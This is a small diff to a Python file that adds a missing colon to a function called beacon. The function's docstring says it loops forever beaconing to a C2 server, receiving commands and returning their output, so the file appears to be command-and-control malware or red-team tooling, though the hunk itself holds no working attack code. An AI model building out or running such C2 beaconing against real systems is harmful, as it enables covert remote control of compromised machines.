@@ -28,7 +28,7 @@ Returns: None
 Description: Loops infinately and beacons to c2 server. Recieves commands
 			 and sends back command output
 """
-def beacon()
+def beacon():
 	#loop
 	while True:
 		cmds = {}
